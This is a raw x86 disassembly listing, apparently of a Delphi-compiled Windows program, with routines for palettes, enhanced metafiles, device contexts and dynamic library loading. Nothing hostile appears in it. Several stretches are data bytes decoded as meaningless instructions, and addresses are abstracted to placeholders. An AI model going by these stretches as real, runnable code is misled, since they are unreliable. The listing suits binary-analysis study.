xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0x0
retn
sub_464125
add [ eax ] al
add [ edx ] al
loopne r-xdata
mov esp ebp
pop ebp
retn
mov esi 0x101aa874
mov edi [ edx + 0x3000aa00 ]
or al 0xab
add [ eax + 0x1c ] al
inc esi
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46426d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0xc ]
mov ecx r-xdata
call sub_4059e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464274
lea eax [ ebp - 0x2c ]
call sub_403f6c
lea eax [ ebp - 0x8 ]
call sub_40599c
lea eax [ ebp - 0x4 ]
call sub_404678
retn
lea edx [ ebp - 0x2c ]
mov eax [ ebx + 0x1c ]
call sub_4230c8
mov edx [ ebp - 0x2c ]
lea eax [ ebp - 0x4 ]
call sub_4047c4
mov [ ebp - 0x28 ] 0x20
mov eax [ ebp - 0x4 ]
call sub_4047d4
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x1c ]
call sub_42313c
mov [ ebp - 0x30 ] eax
fild [ ebp - 0x30 ]
fmul [ r-xdata ]
fistp [ ebp - 0x20 ]
fwait
mov eax [ ebx + 0x1c ]
call sub_423178
test al 0x1
je r-xdata
mov [ ebp - 0x18 ] 0x190
mov [ ebp - 0x18 ] 0x2bc
jmp r-xdata
mov eax [ ebx + 0x1c ]
call sub_4231e0
and eax 0xff
mov [ ebp - 0x16 ] ax
mov eax [ ebx + 0x1c ]
call sub_423178
test al 0x2
setne al
neg al
sbb eax eax
mov [ ebp - 0x14 ] eax
mov eax [ ebx + 0x1c ]
call sub_423178
test al 0x4
setne al
neg al
sbb eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x1c ]
call sub_423178
test al 0x8
setne al
neg al
sbb eax eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
call sub_40599c
mov ecx eax
mov edx r-xdata
lea eax [ ebp - 0x28 ]
call sub_464bcc
call sub_461ccc
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_463c54
sub_4642a0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4642ef
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
mov ecx r-xdata
call sub_4059e0
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_463c54
mov eax ebx
mov edx [ eax ]
call [ edx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4642f6
sub_46430c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_463bc8
mov [ edi + 0x1c ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_464348
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_425344
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4643b6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
add eax 0x28
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
mov ecx r-xdata
call sub_4059e0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov edx [ ebp - 0x8 ]
call sub_425ccc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4643bd
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0x0
mov eax [ ebp - 0x8 ]
call sub_40321c
retn
sub_4643c1
add [ eax ] al
add [ eax + 0x327bf809 ] al
mov edi 0xbb8b101a
add [ edx - 0x54f3d000 ] ch
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
mov ecx r-xdata
call sub_4059e0
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x9 ] 0x0
mov [ ebp - 0x2c ] 0x14
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x1c ]
mov ebx [ esi + 0xc ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_4280f0
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_464479
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x14 ]
call sub_429890
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x14 ]
call sub_4298c4
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x9 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_40321c
retn
mov [ ebp - 0x28 ] 0x4
mov eax ebx
mov edx [ r-xdata ]
call sub_4033a8
test al al
jne r-xdata
mov [ ebp - 0x28 ] 0x3
mov eax esi
call sub_425c9c
call sub_429b14
mov [ ebp - 0x24 ] eax
jmp r-xdata
mov eax esi
call sub_425cb4
call sub_4266e4
mov [ ebp - 0x24 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_426458
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_464589
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_4260b4
mov edx eax
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_4260cc
mov edx eax
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
push 0x0
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_426124
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_46455d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
push eax
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x18 ]
call sub_42397c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464564
mov eax [ ebp - 0x18 ]
call sub_40321c
retn
mov eax [ ebp - 0x8 ]
call sub_40599c
push eax
cmp [ ebp - 0x9 ] 0x1
cmc
sbb ecx ecx
mov edx r-xdata
lea eax [ ebp - 0x2c ]
call sub_464be8
call sub_461ccc
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov eax [ ebp - 0x4 ]
call sub_463c54
sub_464564
mov eax [ ebp - 0x10 ]
call sub_427274
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x9 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_40321c
retn
sub_4645e7
add [ eax + 0x327bf809 ] al
mov edi 0xbb8b101a
add [ edx - 0x54f3d000 ] ch
or [ ecx ] 0xbf327bf8
sbb dl [ eax ]
mov edi [ ebx + 0x3000aa00 ]
or al 0xab
push ebx
mov ebx eax
mov eax ebx
call sub_463c54
mov eax ebx
mov edx [ eax ]
call [ edx + 0x4 ]
pop ebx
retn
sub_46461c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41a740
pop esi
pop ebx
retn
lea eax [ ebx + 0x28 ]
mov edx [ esi + 0x28 ]
call sub_4059b4
pop esi
pop ebx
retn
sub_464654
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_423ad8
xor eax eax
push ebp
push sub_464752
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_423dcc
mov edi eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x9 ] 0x0
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebx + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
cmp [ ebp - 0xc ] 0x4
jne r-xdata
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
push edi
call SelectPalette
mov [ ebp - 0x8 ] eax
push edi
call RealizePalette
mov [ ebp - 0x9 ] 0x1
push esi
mov eax ebx
call sub_464804
neg eax
push eax
mov eax ebx
call sub_464820
push eax
mov eax ebx
call sub_464804
dec eax
push eax
push 0x0
mov eax [ esi + 0xc ]
sub eax [ esi + 0x4 ]
push eax
mov eax [ esi + 0x8 ]
sub eax [ esi ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
push edi
mov eax [ ebx + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x20 ]
call sub_461ccc
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebx + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
push esi
mov eax [ ebp - 0x10 ]
push eax
push edi
call PlayEnhMetaFile
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_423cc4
retn
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
push edi
call SelectPalette
cmp [ ebp - 0x9 ] 0x0
je r-xdata
sub_464760
push ebx
push ecx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
mov al 0x1
pop edx
pop ebx
retn
push esp
mov eax [ ebx + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
test eax eax
jne r-xdata
cmp [ esp ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ebx
retn
sub_46478c
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi eax
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx edx
push 0x0
call GetDC
mov esi eax
push 0x3
push esi
call SetMapMode
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
neg [ ebx + 0x4 ]
push 0x1
push ebx
push esi
call LPtoDP
push esi
push 0x0
call ReleaseDC
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_4647d4
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_464804
mov edx eax
lea ecx [ esp + 0x8 ]
xor eax eax
call sub_418d40
lea eax [ esp + 0x8 ]
mov edx esp
call sub_46478c
mov eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_464804
push ecx
xor edx edx
mov [ esp ] edx
cmp [ eax + 0x28 ] 0x0
je r-xdata
mov eax [ esp ]
pop edx
retn
push esp
mov eax [ eax + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
sub_464820
push ecx
xor edx edx
mov [ esp ] edx
cmp [ eax + 0x28 ] 0x0
je r-xdata
mov eax [ esp ]
pop edx
retn
push esp
mov eax [ eax + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
sub_46483c
push ecx
xor edx edx
cmp [ eax + 0x28 ] 0x0
je r-xdata
mov eax edx
pop edx
retn
push esp
mov eax [ eax + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov edx [ esp ]
sub_464858
push ecx
xor edx edx
cmp [ eax + 0x28 ] 0x0
je r-xdata
mov eax edx
pop edx
retn
push esp
mov eax [ eax + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x40 ]
test [ esp ] 0x2
setne dl
sub_464878
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_464820
lea ecx [ esp + 0x8 ]
xor edx edx
call sub_418d40
lea eax [ esp + 0x8 ]
mov edx esp
call sub_46478c
mov eax [ esp ]
add esp 0x10
pop ebx
retn
sub_4648bc
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_4648fa
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e60
mov eax [ ebp - 0x4 ]
call sub_4648a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464901
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_464904
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
pop esi
pop ebx
retn
push esi
mov eax [ ebx + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x24 ]
call sub_461ccc
sub_464924
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_464962
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e60
mov eax [ ebp - 0x4 ]
call sub_4648a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464969
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_464970
push ebx
push esi
mov esi edx
mov ebx eax
push r-xdata
lea eax [ ebx + 0x28 ]
call sub_40599c
push eax
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_420634
test eax eax
je r-xdata
or ecx 0xffffffff
xor edx edx
call sub_464c10
call sub_461ccc
pop esi
pop ebx
retn
sub eax 0xffffffec
sub_4649ad
add [ eax ] al
add [ eax + 0x327bf809 ] al
mov edi 0xbb8b101a
add [ edx - 0x54f3d000 ] ch
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_464a27
push [ fs : eax ]
mov [ fs : eax ] esp
push 0xffffffff
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_420634
test eax eax
je r-xdata
push eax
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x28 ]
mov ecx r-xdata
call sub_4059e0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
call sub_461ccc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464a2e
lea eax [ ebp - 0x4 ]
call sub_40599c
retn
sub eax 0xffffffec
sub_464a33
add [ ecx ] cl
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_464a83
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e60
mov eax [ ebp - 0x4 ]
call sub_4648a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464a8a
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_464a90
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_464acf
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e60
mov eax [ ebp - 0x4 ]
call sub_4648a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464ad6
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_464adc
cmp [ rw-data ] 0x0
jne r-xdata
retn
mov edx 0x8000
mov eax r-xdata
call sub_40d478
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_464be8
push ebp
mov ebp esp
push ebx
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x8000ffff
mov ebx [ ebp + 0x8 ]
push ebx
push ecx
push edx
push eax
call [ rw-data ]
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_464c10
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_405a10
xor eax eax
push ebp
push sub_464c6f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov ebx 0x8000ffff
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push esi
push ebx
mov eax [ ebp - 0x4 ]
push eax
call [ rw-data ]
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464c76
lea eax [ ebp - 0x4 ]
call sub_40599c
retn
sub_464c80
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_464cd5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464cdc
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x10
mov eax [ rw-data ]
push eax
call SendMessageA
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_464d4c
sub eax 0x3700464d
dec ebp
inc esi
add [ ecx + 0x4d ] al
inc esi
add [ 0xf00464d ] al
dec ebp
inc esi
add [ ecx ] bl
dec ebp
inc esi
add [ ebx ] ah
dec ebp
inc esi
add [ edx ] al
add [ eax ] al
add [ eax ] al
add al 0x2
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
dec esp
dec ebp
inc esi
add [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
dec esp
dec ebp
inc esi
add [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
dec ebp
inc esi
add [ eax + 0x4d ] ch
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
dec ebp
inc esi
add [ eax + eax ] cl
add [ eax ] al
or [ ecx ] dl
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
inc eax
add [ esi ] cl
push esp
inc ebp
jbe r-xdata
add [ esp + 0x4 ] 0xfffffdb0
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0xe0 ]
outsb
je r-xdata
add al 0xb4
std
imul esi [ ebx + 0x70 ] 0x68637461
nop
int3
sub_465378
mov ss [ edx + 0x46 ]
add [ eax ] al
add [ eax ] al
add [ esp + edx * 2 + 0x55340046 ] ah
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh ah
push esp
inc esi
add [ edx * 2 + 0x2680046 ] ah
add [ eax ] al
jo r-xdata
push ecx
inc esi
add [ edx + eax ] cl
add [ eax ] al
add [ eax ] al
add [ ebx + 0x4653c0c0 ] cl
add [ esi + 0x4652 ] cl
inc ebx
add [ edx + eax + 0x34700042 ] ch
inc eax
add [ eax ] al
cld
inc ecx
add [ eax + 0x34 ] bh
inc eax
add [ eax + 0x31b40046 ] bl
inc eax
add al dl
xor [ eax ] eax
fcomp [ ecx + 0x46 ]
add ah bl
jpo r-xdata
add [ esi + ebp * 2 + 0x44 ] ch
add [ ecx + 0x46 ] dl
add [ eax - 0x59 ] al
inc ecx
add [ eax + 0x29 ] ah
inc esp
add [ ebp + edi * 8 + 0x43 ] dh
add [ eax - 0x4bffbbd0 ] al
push 0x46
add ah al
add al [ edx ]
lodsb [ esi ]
inc [ ecx ]
movsb [ edi ] [ esi ]
inc [ ecx ]
push 0x6c004677
push edi
inc esi
add al dh
jbe r-xdata
add [ eax + eax + 0x1c ] 0x6d
inc esp
add [ eax + esi * 2 + 0x44 ] al
add [ eax ] dh
outsd
inc esi
add [ eax + 0x67 ] bh
inc esi
add [ edx + ebp ] bl
inc eax
add [ eax + 0x68 ] bl
inc esi
add [ ecx ] ch
inc esi
add [ esi + edi * 2 - 0x7f43ffba ] ah
inc esi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edi ] al
add [ eax ] al
add [ esp + esi * 2 + 0x2180041 ] ah
add [ eax ] al
mov eax 0x1c004175
add al [ eax ]
add [ ebp + esi * 2 + 0x2200041 ] al
add [ eax ] al
lodsb [ esi ]
adc [ eax ] eax
and al 0x2
add [ eax ] al
hlt
add al ah
sub eax [ eax + eax - 0x8 ]
outsb
inc esp
add [ edi + ebp * 2 + 0x69d40044 ] dh
inc esi
add [ eax - 0x7ffbb91 ] bl
xor [ eax + eax - 0x74 ] al
aaa
inc esp
add [ eax * 2 + 0x3f180044 ] ch
inc esp
add [ edx + eax * 2 ] dl
inc esp
add al bh
pop edi
inc esi
add ah al
inc ebp
inc esp
add al cl
inc ebp
inc esp
add al al
bound eax [ esi ]
sub [ esp + eax * 2 ] al
fdiv [ eax + 0x44 ]
add [ eax + 0x4e ] dh
inc esp
add [ edx + eax * 4 + 0x6d1c0044 ] ch
add [ eax ] dh
sti
inc ebx
add [ ebx + edi * 8 ] dh
inc ebx
add [ eax ] dh
sub eax [ eax + eax + 0x5c ]
sub eax [ eax + eax + 0x74 ]
push es
inc esp
add [ esp + edi * 8 + 0x8000043 ] ch
inc esp
add [ ebx + ebp * 2 + 0xa8c0046 ] bl
inc esp
add [ eax ] bh
or [ eax + eax + 0x2c ] eax
jno r-xdata
add [ esp + edi * 2 ] cl
inc esp
add [ eax + 0x7b ] bl
inc esp
add al ch
sti
inc ebx
add [ ecx + esi * 2 + 0x44 ] ch
add [ ecx + esi * 2 + 0x6e6c0044 ] cl
inc esp
sub_465558
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx edx
xor edx edx
push ebp
push sub_465596
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x4 ]
call sub_463ac0
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_413890
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46559d
lea eax [ ebp - 0x4 ]
call sub_40599c
retn
sub_4655a4
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_465601
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_413404
mov edx [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
mov ecx r-xdata
call sub_4059e0
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_463b10
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465608
lea eax [ ebp - 0x8 ]
call sub_40599c
lea eax [ ebp - 0x4 ]
call sub_40599c
retn
sub_465620
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_40f174
mov eax esi
call sub_404d94
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x8
pop esi
pop ebx
retn
sub_465664
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_4032d0
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x208 ]
add eax 0x10
push eax
push esi
call IsEqualGUID
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax 0x80004002
mov ecx edi
mov edx r-xdata
mov eax ebx
call sub_4032d0
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_465724
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp esi 0xfffffda1
jl r-xdata
mov ecx [ ebp + 0x1c ]
mov edx esi
mov eax [ edi + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xcc ]
cmp esi 0xfffffda8
jg r-xdata
mov ecx [ ebp + 0x1c ]
mov edx esi
mov eax [ edi + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc8 ]
jmp r-xdata
xor eax eax
pop edi
pop esi
pop ebx
pop ebp
retn 0x24
sub_46576c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_442db8
or [ ebx + 0x24 ] 0x2
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov eax [ ebx + 0x208 ]
inc [ eax + 0x48 ]
mov eax [ ebx + 0x208 ]
cmp [ eax + 0x34 ] 0x0
jle r-xdata
add esp 0xfffffff0
call sub_403540
mov eax [ ebx + 0x208 ]
cmp [ eax + 0x3c ] 0x0
jle r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov esi eax
mov [ ebx + 0x240 ] esi
mov eax [ ebx + 0x208 ]
mov edx [ eax + 0x34 ]
mov eax esi
call sub_41a33c
mov eax [ ebx + 0x240 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_465640
mov [ ebx + 0x210 ] eax
mov eax ebx
call sub_465de0
mov edx [ ebx + 0x218 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd4 ]
lea eax [ ebx + 0x23c ]
push eax
push 0x1
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x58 ]
call sub_461ccc
mov eax [ ebx + 0x208 ]
test [ eax + 0x44 ] 0x2
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov esi eax
mov [ ebx + 0x244 ] esi
mov eax [ ebx + 0x208 ]
mov edx [ eax + 0x3c ]
mov eax esi
call sub_41a33c
mov eax [ ebx + 0x244 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
lea eax [ ebx + 0x21c ]
call sub_40599c
push eax
push r-xdata
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax ]
call sub_461ccc
test [ ebx + 0x23d ] 0x4
je r-xdata
test [ ebx + 0x23e ] 0x2
jne r-xdata
inc edi
xor esi esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_422ce4
mov ecx eax
mov eax [ ebx + 0x240 ]
mov edx esi
call sub_41a290
inc esi
dec edi
jne r-xdata
test [ ebx + 0x23e ] 0x1
je r-xdata
xor edx edx
mov eax ebx
call sub_4407c4
mov eax ebx
test eax eax
je r-xdata
mov eax [ ebx + 0x208 ]
test [ eax + 0x44 ] 0x1
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_425b7c
mov ecx eax
mov eax [ ebx + 0x244 ]
mov edx esi
call sub_41a290
mov eax [ ebx + 0x244 ]
mov edx esi
call sub_41a19c
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_4668ac
inc esi
dec edi
jne r-xdata
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
push eax
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
call sub_461ccc
sub eax 0xfffffd9c
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
test [ ebx + 0x23d ] 0x60
sete dl
mov eax ebx
call sub_4472f8
push ebx
call sub_46781c
call sub_461ccc
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
sub_4659a0
push ebx
push esi
push edi
mov esi eax
cmp [ esi ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esi ]
call sub_40321c
xor eax eax
mov [ esi ] eax
